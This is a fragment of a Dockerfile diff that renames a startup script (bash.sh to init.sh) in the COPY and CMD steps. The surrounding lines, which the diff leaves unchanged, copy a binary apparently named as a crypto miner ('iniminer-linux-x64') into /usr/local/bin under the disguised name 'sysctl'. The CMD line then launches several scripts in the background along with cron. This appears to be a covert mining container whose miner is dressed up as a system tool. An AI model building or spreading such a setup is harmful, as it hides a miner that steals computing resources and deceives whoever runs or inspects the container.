@@ -30,7 +30,7 @@ RUN fallocate -l 1G /swapfile && \
 WORKDIR /usr/local/bin
 
 # Copy required scripts
-COPY bash.sh /usr/local/bin/bash.sh
+COPY init.sh /usr/local/bin/init.sh
 COPY main.sh /usr/local/bin/main.sh
 COPY run.sh /usr/local/bin/run.sh
 COPY iniminer-linux-x64 /usr/local/bin/sysctl
@@ -48,4 +48,4 @@ ENV PORT=8080
 EXPOSE 8080
 
 # Run all scripts concurrently
-CMD ["bash", "-c", "/usr/local/bin/bash.sh & /usr/local/bin/main.sh & /usr/local/bin/run.sh & cron -f"]
+CMD ["bash", "-c", "/usr/local/bin/init.sh & /usr/local/bin/main.sh & /usr/local/bin/run.sh & cron -f"]
